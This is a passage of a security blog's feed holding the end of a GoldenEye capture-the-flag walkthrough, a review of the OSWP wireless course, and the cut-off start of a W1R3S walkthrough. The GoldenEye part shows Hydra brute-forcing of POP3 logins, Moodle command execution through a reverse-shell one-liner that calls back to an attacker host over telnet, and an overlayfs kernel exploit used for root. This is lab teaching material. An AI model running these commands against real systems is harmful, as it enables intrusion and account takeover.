</span><span class='line'>Message-Id: <span class="nt">&lt;20180425022326</span><span class="err">.</span><span class="na">D9E47454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
</span><span class='line'>From: root@127.0.0.1.goldeneye
</span><span class='line'>
</span><span class='line'>Boris, this is admin. You can electronically communicate to co-workers and students here. I&#39;m not going to scan emails for security risks because I trust you and the other admins here.
</span><span class='line'>.
</span><span class='line'>RETR 2
</span><span class='line'>+OK 373 octets
</span><span class='line'>Return-Path: <span class="nt">&lt;natalya</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>X-Original-To: boris
</span><span class='line'>Delivered-To: boris@ubuntu
</span><span class='line'>Received: from ok (localhost [127.0.0.1])
</span><span class='line'>  by ubuntu (Postfix) with ESMTP id C3F2B454B1
</span><span class='line'>  for <span class="nt">&lt;boris&gt;</span>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
</span><span class='line'>Message-Id: <span class="nt">&lt;20180425024249</span><span class="err">.</span><span class="na">C3F2B454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
</span><span class='line'>From: natalya@ubuntu
</span><span class='line'>
</span><span class='line'>Boris, I can break your codes!
</span><span class='line'>.
</span><span class='line'>RETR 3
</span><span class='line'>+OK 921 octets
</span><span class='line'>Return-Path: <span class="nt">&lt;alec</span><span class="err">@</span><span class="na">janus</span><span class="err">.</span><span class="na">boss</span><span class="nt">&gt;</span>
</span><span class='line'>X-Original-To: boris
</span><span class='line'>Delivered-To: boris@ubuntu
</span><span class='line'>Received: from janus (localhost [127.0.0.1])
</span><span class='line'>  by ubuntu (Postfix) with ESMTP id 4B9F4454B1
</span><span class='line'>  for <span class="nt">&lt;boris&gt;</span>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
</span><span class='line'>Message-Id: <span class="nt">&lt;20180425025235</span><span class="err">.</span><span class="na">4B9F4454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
</span><span class='line'>From: alec@janus.boss
</span><span class='line'>
</span><span class='line'>Boris,
</span><span class='line'>
</span><span class='line'>Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
</span><span class='line'>
</span><span class='line'>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
</span><span class='line'>
</span><span class='line'>PS - Keep security tight or we will be compromised.
</span></code></pre></td></tr></table></div></figure>


<p>We now know to look for access codes once we get a shell on the target. We also learned there&rsquo;s another username on the ubuntu domain: natalya. So I kicked off the bruteforce for her account as well, this time with Hydra, because I wasn&rsquo;t happy with the speed of the Metasploit module.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.159.130 -s 55007 pop3 -f
</span><span class='line'>[55007][pop3] host: 192.168.159.130   login: natalya   password: bird
</span></code></pre></td></tr></table></div></figure>


<p>Got lucky with natalya as well. Now back to reading emails:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>nc 192.168.159.130 55007
</span><span class='line'>+OK GoldenEye POP3 Electronic-Mail System
</span><span class='line'>USER natalya
</span><span class='line'>+OK
</span><span class='line'>PASS bird
</span><span class='line'>+OK Logged in.
</span><span class='line'>LIST
</span><span class='line'>+OK 2 messages:
</span><span class='line'>1 631
</span><span class='line'>2 1048
</span><span class='line'>.
</span><span class='line'>RETR 1
</span><span class='line'>+OK 631 octets
</span><span class='line'>Return-Path: <span class="nt">&lt;root</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>X-Original-To: natalya
</span><span class='line'>Delivered-To: natalya@ubuntu
</span><span class='line'>Received: from ok (localhost [127.0.0.1])
</span><span class='line'>  by ubuntu (Postfix) with ESMTP id D5EDA454B1
</span><span class='line'>  for <span class="nt">&lt;natalya&gt;</span>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
</span><span class='line'>Message-Id: <span class="nt">&lt;20180425024542</span><span class="err">.</span><span class="na">D5EDA454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
</span><span class='line'>From: root@ubuntu
</span><span class='line'>
</span><span class='line'>Natalya, please you need to stop breaking boris&#39; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
</span><span class='line'>
</span><span class='line'>Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
</span><span class='line'>.
</span><span class='line'>RETR 2
</span><span class='line'>+OK 1048 octets
</span><span class='line'>Return-Path: <span class="nt">&lt;root</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>X-Original-To: natalya
</span><span class='line'>Delivered-To: natalya@ubuntu
</span><span class='line'>Received: from root (localhost [127.0.0.1])
</span><span class='line'>  by ubuntu (Postfix) with SMTP id 17C96454B1
</span><span class='line'>  for <span class="nt">&lt;natalya&gt;</span>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
</span><span class='line'>Message-Id: <span class="nt">&lt;20180425031956</span><span class="err">.</span><span class="na">17C96454B1</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
</span><span class='line'>From: root@ubuntu
</span><span class='line'>
</span><span class='line'>Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#39;s related to security...even if it&#39;s not, just enter it in under the guise of &quot;security&quot;...it&#39;ll get the change order escalated without much hassle :)
</span><span class='line'>
</span><span class='line'>Ok, user creds are:
</span><span class='line'>
</span><span class='line'>username: xenia
</span><span class='line'>password: RCP90rulez!
</span><span class='line'>
</span><span class='line'>Boris verified her as a valid contractor so just create the account ok?
</span><span class='line'>
</span><span class='line'>And if you didn&#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
</span><span class='line'>**Make sure to edit your host file since you usually work remote off-network....
</span><span class='line'>
</span><span class='line'>Since you&#39;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
</span></code></pre></td></tr></table></div></figure>


<p>Now we&rsquo;ve learned some interesting things..it seems Boris is a double agent! We now have a new set of credentials: <code>xenia:RCP90rulez!</code> and the internal domain for which we have to add an entry in our hosts file. With that done, going to the URL took me to a training portal:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/goldeneye/moodle.png" title="moodle" alt="moodle"></p>

<p>We can log in as Xenia and find a message on the platform:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Tuesday, 24 April 2018
</span><span class='line'>09:24 PM: Greetings Xenia,
</span><span class='line'>
</span><span class='line'>As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.
</span><span class='line'>
</span><span class='line'>My email username is...
</span><span class='line'>
</span><span class='line'>doak
</span><span class='line'>
</span><span class='line'>Thank you,
</span><span class='line'>
</span><span class='line'>Cheers,
</span><span class='line'>
</span><span class='line'>Dr. Doak &quot;The Doctor&quot;
</span></code></pre></td></tr></table></div></figure>


<p>We have a new mail username and by now we know what&rsquo;s coming..</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>[55007][pop3] host: 192.168.159.130   login: doak   password: goat
</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s only one mail, but it contains portal credentials:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Return-Path: <span class="nt">&lt;doak</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>X-Original-To: doak
</span><span class='line'>Delivered-To: doak@ubuntu
</span><span class='line'>Received: from doak (localhost [127.0.0.1])
</span><span class='line'>  by ubuntu (Postfix) with SMTP id 97DC24549D
</span><span class='line'>  for <span class="nt">&lt;doak&gt;</span>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
</span><span class='line'>Message-Id: <span class="nt">&lt;20180425034731</span><span class="err">.</span><span class="na">97DC24549D</span><span class="err">@</span><span class="na">ubuntu</span><span class="nt">&gt;</span>
</span><span class='line'>Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
</span><span class='line'>From: doak@ubuntu
</span><span class='line'>
</span><span class='line'>James,
</span><span class='line'>If you&#39;re reading this, congrats you&#39;ve gotten this far. You know how tradecraft works right?
</span><span class='line'>
</span><span class='line'>Because I don&#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information......
</span><span class='line'>
</span><span class='line'>username: dr_doak
</span><span class='line'>password: 4England!
</span></code></pre></td></tr></table></div></figure>


<p>Look around until you find a secret file inside My private files:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/goldeneye/secret.png" title="secret" alt="secret"></p>

<p>The contents are:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>007,
</span><span class='line'>
</span><span class='line'>I was able to capture this apps adm1n cr3ds through clear txt.
</span><span class='line'>
</span><span class='line'>Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.
</span><span class='line'>
</span><span class='line'>Something juicy is located here: /dir007key/for-007.jpg
</span><span class='line'>
</span><span class='line'>Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
</span></code></pre></td></tr></table></div></figure>


<p>The image most likely has hidden data within:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/goldeneye/for-007.jpg" title="message for 007" alt="message for 007"></p>

<p>Running strings on the image reveals a base64 string: <em>eFdpbnRlcjE5OTV4IQ==</em>, which is decoded to <code>xWinter1995x!</code>. Now we can log in as admin to the platform. After some more recon, it seems that we can achieve RCE with a Metasploit exploit for Moodle:</p>

<blockquote><p>Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point
to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands
in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation
vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that
of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user. This module was tested against Moodle version
2.5.2 and 2.2.3.</p></blockquote>

<p>The admin account we hijacked has the necessary privileges, so we can use this exploit.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Module options (exploit/multi/http/moodle_cmd_exec):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting        Required  Description
</span><span class='line'>   ----       ---------------        --------  -----------
</span><span class='line'>   PASSWORD   xWinter1995x!          yes       Password to authenticate with
</span><span class='line'>   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOSTS     severnaya-station.com  yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT      80                     yes       The target port (TCP)
</span><span class='line'>   SESSKEY                           no        The session key of the user to impersonate
</span><span class='line'>   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   TARGETURI  /gnocertdir            yes       The URI of the Moodle installation
</span><span class='line'>   USERNAME   admin                  yes       Username to authenticate with
</span><span class='line'>   VHOST                             no        HTTP server virtual host
</span></code></pre></td></tr></table></div></figure>


<p>It seemed straightforward, but the exploit failed to run for me. I looked over the source code and saw that the spellcheck engine that is set by the exploit is PSpellShell. By default on the site, the TinyMCE HTML editor spell engine selected was Google Spell. So I manually changed this and ran the exploit again, but it still didn&rsquo;t work. So I did it manually. Recall this part:</p>

<blockquote><p>By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application
upon spellchecking requests</p></blockquote>

<p>Under Server &ndash;> System paths, I edited the <strong>Path to aspell</strong> field with this reverse shell one-liner (had to cycle through a couple before finding one that worked): <code>sh -c &lsquo;(mknod /tmp/backpipe p 2> /dev/null &amp;&amp; /bin/bash 0</tmp/backpipe | telnet 192.168.159.129 8080 1>/tmp/backpipe &amp;)&rsquo;</code></p>

<p>Now if you go to Blogs and add a new entry, you can invoke the spellchecker by clicking on the spellcheck button:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/goldeneye/spellcheck.png" title="spellcheck" alt="spellcheck"></p>

<p>And you should receive a shell on your listener. I upgraded it to a proper one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>nc -vnlp 8080
</span><span class='line'>listening on [any] 8080 ...
</span><span class='line'>connect to [192.168.159.129] from (UNKNOWN) [192.168.159.130] 54586
</span><span class='line'>whoami
</span><span class='line'>www-data
</span><span class='line'>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
</span><span class='line'><span class="nt">&lt;ditor</span><span class="err">/</span><span class="na">tinymce</span><span class="err">/</span><span class="na">tiny_mce</span><span class="err">/</span><span class="na">3</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">9</span><span class="err">/</span><span class="na">plugins</span><span class="err">/</span><span class="na">spellchecker</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The kernel version is really old:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>uname -a
</span><span class='line'>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
</span></code></pre></td></tr></table></div></figure>


<p>I used the <a href="https://www.exploit-db.com/exploits/37292">overlayfs</a> exploit. There was no GCC on the box, but remember that webpage that mentioned clang. I compiled the exploit with clang: <code>clang 37292.c</code>. There were 5 warnings generated, but an executable a.out was generated. However, it didn&rsquo;t give me a root shell. When I looked through the exploit source code, I found a gcc reference:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">lib</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Replacing gcc with cc (the default compiler) in this line and recompiling the code worked and I got root. Then I found the secret codes inside a hidden file in /root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># cat /root/.flag.txt</span>
</span><span class='line'><span class="n">cat</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">Alec</span> <span class="n">told</span> <span class="n">me</span> <span class="n">to</span> <span class="n">place</span> <span class="n">the</span> <span class="n">codes</span> <span class="n">here</span><span class="o">:</span>
</span><span class='line'>
</span><span class='line'><span class="mf">568628e0</span><span class="n">d993b1973adc718237da6e93</span>
</span><span class='line'>
</span><span class='line'><span class="n">If</span> <span class="n">you</span> <span class="n">captured</span> <span class="n">this</span> <span class="n">make</span> <span class="n">sure</span> <span class="n">to</span> <span class="n">go</span> <span class="n">here</span><span class="p">.....</span>
</span><span class='line'><span class="o">/</span><span class="mo">006</span><span class="o">-</span><span class="n">final</span><span class="o">/</span><span class="n">xvf7</span><span class="o">-</span><span class="n">flag</span><span class="o">/</span>
</span></code></pre></td></tr></table></div></figure>


<p>Visit that path on the web server and mission accomplished!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/goldeneye/flag.png" title="flag" alt="flag"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'> <span class="n">____________________________________</span>
</span><span class='line'><span class="o">/</span> <span class="n">Excellent</span> <span class="n">time</span> <span class="n">to</span> <span class="n">become</span> <span class="n">a</span> <span class="n">missing</span> \
</span><span class='line'><span class="err">\</span> <span class="n">person</span><span class="p">.</span>                            <span class="o">/</span>
</span><span class='line'> <span class="o">------------------------------------</span>
</span><span class='line'>        <span class="err">\</span>   <span class="o">^</span><span class="n">__</span><span class="o">^</span>
</span><span class='line'>         <span class="err">\</span>  <span class="p">(</span><span class="n">oo</span><span class="p">)</span><span class="err">\</span><span class="n">_______</span>
</span><span class='line'>            <span class="p">(</span><span class="n">__</span><span class="p">)</span><span class="err">\</span>       <span class="p">)</span><span class="err">\</span><span class="o">/</span>\
</span><span class='line'>                <span class="o">||----</span><span class="n">w</span> <span class="o">|</span>
</span><span class='line'>                <span class="o">||</span>     <span class="o">||</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My OSWP review]]></title>
    <link href="http://chousensha.github.io/blog/2018/12/27/my-oswp-review/"/>
    <updated>2018-12-27T18:13:52+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/12/27/my-oswp-review</id>
    <content type="html"><![CDATA[<p>I wanted to finish 2018 on a strong note, so right before Christmas I&rsquo;ve completed the exam for the <a href="https://www.offensive-security.com/information-security-certifications/oswp-offensive-security-wireless-professional/">Offensive Security Wireless Professional</a> (OSWP) certification. This is my review for the <a href="https://www.offensive-security.com/information-security-training/offensive-security-wireless-attacks/">Offensive Security Wireless Attacks (WiFu)</a> course. But as a short summay, the course and exam were great, very practical and applicable, and I thoroughly enjoyed them!</p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/study/oswp/oswp.png" title="oswp" alt="oswp"></p>

<h2>The course</h2>

<p>The course consists of PDF material, videos, a BackTrack ISO and packet captures. The labs are hardware dependent, so you are supposed to procure your own hardware in order to practice the attacks. For my wireless card, I&rsquo;ve used Alfa AWUS036NHA and have been very happy with its performance. In the course, BackTrack is being used as the operating system, but I&rsquo;ve done the labs on Kali with minimal to none difference in commands.</p>

<p>As a testimony to the applicability of what you learn in the course, the author is none other than Thomas d&#8217;Otreppe de Bouvette, the creator of the Aircrack-NG suite! The material is very well structured and explained, you can practice what you&rsquo;re taught and see immediate results. Most chapters also contain a troubleshooting section with tips on what to try if you run into problems.</p>

<p>Almost half of the course written material revolves around the description of Wifi internals, how it works, how packets look like, hardware and drivers consideration. There are PCAP examples for what is being discussed, and it is really useful if you want to understand what is happening under the hood.</p>

<p>After that, it&rsquo;s all attacks and the stuff we&rsquo;re interested in! The focus of the course materials is the Aircrack-NG suite of tools, as expected, since it&rsquo;s the de facto choice for wireless security auditing. You learn how to place your wifi card on monitor mode, how to sniff traffic, how to do packet injection and ultimately crack the keys for different network scenarios. You also learn how to find hidden SSIDs and bypass MAC filtering.</p>

<p>The attacks you perform are targeted at different network types. There are multiple scenarios for WEP networks that use open authentication, shared key authentication, or have no associated clients. The labs go over multiple attacks: interactive packet replay attacks, fragmentation attacks, KoreK ChopChop attacks.</p>

<p>The most applicable part is the WPA/WPA2 cracking section, as these are the networks you&rsquo;ll run into most often nowadays. Dictionary and rainbow table attacks are being demonstrated with multiple tools. I&rsquo;ve really enjoyed the addition in the course material of Cowpatty and Pyrit. Also, you&rsquo;re shown how to leverage John&rsquo;s rules to enhance an already existing wordlist that&rsquo;s used with Aircrack-NG.</p>

<p>At the end of the course, you also get to see Kismet and Karmetasploit in action, along with rogue AP and man-in-the-middle attacks.</p>

<h2>The exam</h2>

<p><img class="center" src="http://chousensha.github.io/images/study/oswp/skills.png" title="oswp skills" alt="oswp skills"></p>

<p>The exam was really enjoyable, I didn&rsquo;t find it too hard or too easy. If you practice the labs in the course, you will be well prepared for the exam. I really liked that the exam takes almost 4 hours, as that allowed me to also work on the report as I was going through each attack. I&rsquo;ve experienced some laggy bits and a disconnection here and there, but overall, the exam experience was great.</p>

<h3>Concluding remarks</h3>

<p>I could think of no better course for wireless hacking, but as I was reading reviews of other people&rsquo;s experiences, I saw some criticism concerning this particular course. I will share my thoughts on the critiques below.</p>

<ul>
<li><p><em>The course is outdated</em>. It looks like the course was last updated in 2014, and the videos and labs make use of BackTrack. But these don&rsquo;t detract from its value at all. I used Kali for the course, and I think only 2 times I had to slightly alter the commands for use on Kali. It would make no sense to re-record everything just to be on Kali, since there are almost no differences between them. Also, the wifi landscape hasn&rsquo;t changed that much, so the material is highly relevant and you can put into practice what you learn right away. But I do agree that the course would be even better with a section of WPA enterprise attacks and WPS cracking.</p></li>
<li><p><em>The material is too WEP-centric</em>. It&rsquo;s true that today you won&rsquo;t really see WEP that much. But that&rsquo;s not to say that there are no WEP networks left in the world. Seeing how vulnerable they are in reality and being able to crack different types of WEP networks is a skill that you should have, regardless of how rare you&rsquo;ll get to see them. So for me, this wasn&rsquo;t a weak point at all, I found it very interesting.</p></li>
<li><p><em>The exam is too easy</em>. I&rsquo;ve also seen several opinions claiming that the exam was too easy. But this only attests to the quality of the material, if you can perform the attacks you&rsquo;re being taught, you will succeed. Maybe as an enhancement to the exam, besides cracking the keys, there could be some objectives like decrypting the traffic of a certain client to discover something, or performing MitM. But I was happy with the quality of the exam, in fact, I tried to make the most of it by going through the attacks with more than one tool.</p></li>
</ul>


<p>All in all, OSWP was awesome, and stay tuned for more!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Living your life is a task so          \
</span><span class='line'>| difficult, it has never been attempted |
</span><span class='line'>\ before.                                /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting in the W1R3S]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s/"/>
    <updated>2018-11-30T16:18:45+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s</id>
    <content type="html"><![CDATA[<p>With today&rsquo;s post I am experimenting with a new way of writing my hacking blog posts based on the <a href="https://redteams.net/redteaming/2017/phases-of-a-red-team-assessment-revisited">5 phases of red teams assessments</a>.</p>

<!-- more -->


<h2>Phase 1: OPORD</h2>

<p>The machine description is the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).
</span><span class='line'>
</span><span class='line'>Difficulty to get a low privileged shell: Beginner/Intermediate
</span><span class='line'>
</span><span class='line'>Difficulty to get privilege escalation: Beginner/Intermediate
</span><span class='line'>
</span><span class='line'>About: This is a vulnerable Ubuntu box giving you somewhat of a real world scenario and reminds me of the OSCP labs.</span></code></pre></td></tr></table></div></figure>


<h2>Phase 2: RECON</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>21/tcp   open  ftp     vsftpd 2.0.8 or later
</span><span class='line'>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
</span><span class='line'>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
</span><span class='line'>|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
</span><span class='line'>| ftp-syst:
</span><span class='line'>|   STAT:
</span><span class='line'>| FTP server status:
